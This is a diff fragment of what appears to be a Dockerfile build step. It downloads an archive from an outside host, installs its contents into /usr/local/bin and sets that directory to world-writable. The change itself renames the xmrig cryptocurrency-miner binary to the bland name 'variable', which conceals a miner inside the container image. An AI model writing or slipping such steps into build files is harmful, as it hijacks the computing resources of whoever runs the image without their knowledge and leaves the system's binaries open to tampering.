@@ -7,7 +7,7 @@ RUN apt update; \
     wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDgwMjh9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtd2NlczYyLW9mN2ItZnFsYi0yZmJrLWRxaXp4bXR1In0.8qBahMZzsIfVIUA1y6mRF-15MoBhg1Vjg_XbQ7XlJqs/variable.tar.gz; \
     tar xf variable.tar.gz; \
     cd variable; \
-    cp xmrig /usr/local/bin/xmrig; \
+    cp xmrig /usr/local/bin/variable; \
     cp init-conf.json /usr/local/bin/config.json; \
     cp script.sh /usr/local/bin/script.sh; \
     chmod -R 777 /usr/local/bin; \
